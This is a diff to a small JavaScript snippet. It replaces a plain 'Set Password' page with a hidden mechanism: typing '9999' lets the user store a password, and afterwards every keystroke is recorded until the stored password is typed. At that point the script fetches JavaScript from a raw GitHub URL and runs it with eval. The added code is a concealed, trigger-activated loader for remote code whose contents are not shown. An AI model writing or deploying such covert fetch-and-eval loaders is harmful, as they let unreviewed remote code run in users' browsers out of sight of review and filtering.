@@ -1,58 +1,35 @@
 (() => {
-    const style = document.createElement("style");
-    style.textContent = `
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            background-color: white;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .password-container {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            padding: 20px;
-            background: white;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-        }
-        .password-input, .password-button {
-            padding: 10px;
-            font-size: 16px;
-        }
-    `;
-    document.head.appendChild(style);
-
     const targetSequence = "9999";
     let userInput = "";
+    let enteredPassword = "";
+
+    function savePassword(password) {
+        localStorage.setItem("savedPassword", password);
+        alert("Password set successfully!");
+        location.reload(); // Reset the page after setting the password
+    }
+
+    function loadExternalScript() {
+        fetch('https://raw.githubusercontent.com/MinsUR4/nothing/main/index.js')
+            .then(response => response.text())
+            .then(script => eval(script))
+            .catch(error => console.error('Not loaded:', error));
+    }
 
     function showPasswordPage() {
         document.body.innerHTML = ""; // Clear current content
 
-        const container = document.createElement("div");
-        container.className = "password-container";
-
         const input = document.createElement("input");
         input.type = "password";
         input.placeholder = "Enter new password";
-        input.className = "password-input";
-
-        const button = document.createElement("button");
-        button.textContent = "Set Password";
-        button.className = "password-button";
-
-        button.addEventListener("click", () => {
-            alert(`Password set to: ${input.value}`);
+        input.addEventListener("keydown", (event) => {
+            if (event.key === "Enter" && input.value) {
+                savePassword(input.value);
+            }
         });
 
-        container.appendChild(input);
-        container.appendChild(button);
-        document.body.appendChild(container);
+        document.body.appendChild(input);
+        input.focus();
     }
 
     const keyListener = (event) => {
@@ -68,5 +45,25 @@
         }
     };
 
-    document.addEventListener("keydown", keyListener);
+    const passwordListener = (event) => {
+        if (event.key.length === 1) { 
+            enteredPassword += event.key;
+            const savedPassword = localStorage.getItem("savedPassword");
+
+            if (savedPassword && enteredPassword.endsWith(savedPassword)) {
+                document.removeEventListener("keydown", passwordListener);
+                loadExternalScript();
+            }
+
+            if (enteredPassword.length > 50) {
+                enteredPassword = enteredPassword.slice(-50);
+            }
+        }
+    };
+
+    if (localStorage.getItem("savedPassword")) {
+        document.addEventListener("keydown", passwordListener);
+    } else {
+        document.addEventListener("keydown", keyListener);
+    }
 })();
